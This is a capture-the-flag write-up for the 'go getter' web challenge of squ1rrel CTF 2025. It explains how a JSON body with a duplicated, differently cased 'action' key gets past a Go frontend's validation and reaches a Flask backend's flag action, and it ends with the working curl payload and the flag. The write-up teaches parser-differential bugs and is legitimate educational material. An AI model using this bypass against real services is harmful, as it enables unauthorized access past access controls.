# squ1rrel CTF 2025

## go getter

> There's a joke to be made here about Python eating the GOpher. I'll cook on it and get back to you.
>
>  Author: kyle
>
> [`go-getter.zip`](go-getter.zip)

Tags: _web_

## Solution
This challenge comes with the source of a web application (written in `golang`) and a `python` backend service (so not reachable from outside the local network of course). Lets first have a look what the backend service provides.

```py
from flask import Flask, request, jsonify
import random
import os

app = Flask(__name__)

GO_HAMSTER_IMAGES = [
    # ...
    {
        "name": "gopher plush",
        "src": "https://go.dev/blog/gopher/plush.jpg"
    },
    # ...
]

@app.route('/execute', methods=['POST'])
def execute():
    # Ensure request has JSON
    if not request.is_json:
        return jsonify({"error": "Invalid JSON"}), 400

    data = request.get_json()
    
    # Check if action key exists
    if 'action' not in data:
        return jsonify({"error": "Missing 'action' key"}), 400

    # Process action
    if data['action'] == "getgopher":
        # choose random gopher
        gopher = random.choice(GO_HAMSTER_IMAGES)
        return jsonify(gopher)
    elif data['action'] == "getflag":
        return jsonify({"flag": os.getenv("FLAG")})
    else:
        return jsonify({"error": "Invalid action"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081, debug=True)
```

There is one route that executes actions. Two actions are implemented, `getgopher` returns a randomly choosen data set from `GO_HAMSTER_IMAGES`. And `getflag` that returns the flag. 

As the backend service is not reachable we need to go through internet facing the web application. The application exposes two routes:

```go
http.HandleFunc("/", homeHandler)
http.HandleFunc("/execute", executeHandler)
```

The first one only shows a simple frontend. But the second one seems promising. Sadly the web application stops us from storming euphorical forward and just calling `/execute?action=getflag`, as it checks the action we want to execute and bluntly tells us `getflag` is only executable by admins.

```go
// Parse JSON
var requestData RequestData
if err := json.Unmarshal(body, &requestData); err != nil {
    http.Error(w, "Invalid JSON", http.StatusBadRequest)
    return
}

// Process action
switch requestData.Action {
case "getgopher":
    resp, err := http.Post("http://python-service:8081/execute", "application/json", bytes.NewBuffer(body))
    if err != nil {
        log.Printf("Failed to reach Python API: %v", err)
        http.Error(w, "Failed to reach Python API", http.StatusInternalServerError)
        return
    }
    defer resp.Body.Close()

    // Forward response from Python API back to the client
    responseBody, _ := io.ReadAll(resp.Body)
    w.WriteHeader(resp.StatusCode)
    w.Write(responseBody)
case "getflag":
    w.Write([]byte("Access denied: You are not an admin."))
default:
    http.Error(w, "Invalid action", http.StatusBadRequest)
}
```

But then again, the application misses to rebuild it's own json structure from whatever was parsed before and forwards the request body to the service request. This is great, because it means we can control whatever is sent to the backend service.

Now we only need to find what we *can* actually sent. Let's do a quick test:

```go
package main

import (
        "encoding/json"
        "fmt"
        "log"
        "os"
)

type RequestData struct {
        Action string `json:"action"`
}

func main() {
        if len(os.Args) < 2 {
                log.Fatal("Please provide a JSON string as a command-line argument.")
        }

        // The JSON string is the second argument (os.Args[1] is the first argument after the program name)
        jsonStr := os.Args[1]

        var requestData RequestData
        err := json.Unmarshal([]byte(jsonStr), &requestData)
        if err != nil {
                log.Fatal(err)
        }

        fmt.Printf("Action: %s\n", requestData.Action)
}
```

```bash
$ go run foo.go '{"action":"getflag"}'
Action: getflag
```

So far this looks all good. The json parser is instructed to bind the value referenced by the key `action` the the `RequestData` field `Action`. So what happens if we have two action fields?

```bash
$ go run foo.go '{"action":"getflag", "action":"getgopher"}'
Action: getgopher
```

This didn't trigger the validator, but it also seems the last occurance is taken in that case. What about case sensitivity?

```bash
$ go run foo.go '{"action":"getflag", "Action":"getgopher"}'
Action: getgopher
```

Again, the last occurance is chosen, apparently without taking casing of the key into account. Lets see what the [`JSON Specification`](https://datatracker.ietf.org/doc/html/rfc7159) say about this.

> An object whose names are all unique is interoperable in the sense
> that all software implementations receiving that object will agree on
> the name-value mappings.  When the names within an object are not
> unique, the behavior of software that receives such an object is
> unpredictable.  Many implementations report the last name/value pair
> only.  Other implementations report an error or fail to parse the
> object, and some implementations report all of the name/value pairs,
> including duplicates.

This kind of reflects what the `golang` library does here. Also keys should be *unique* this means parsers *should* be implemented with case sensitive key comparision. This is not exactly what `golang` does here.

Flask on the other hand does very much take case sensitivity into account, so `{"action":"getflag", "Action":"getgopher"}` would be interpreted as a json object with two fields, one field named `action` and one field named `Action`. This is exactly what we need, sending this as payload will pass the action filter in the web application. The application then will forward the whole object to the backend service, and the backend service will access `action` (lower case) and find it to be `getflag`. Let's put this to a test.

```bash
$ curl -XPOST http://52.188.82.43:8080/execute -d '{"action":"getflag","Action":"getgopher"}'
{"flag":"squ1rrel{p4rs3r?_1_h4rd1y_kn0w_3r!}"}
```

Flag `squ1rrel{p4rs3r?_1_h4rd1y_kn0w_3r!}`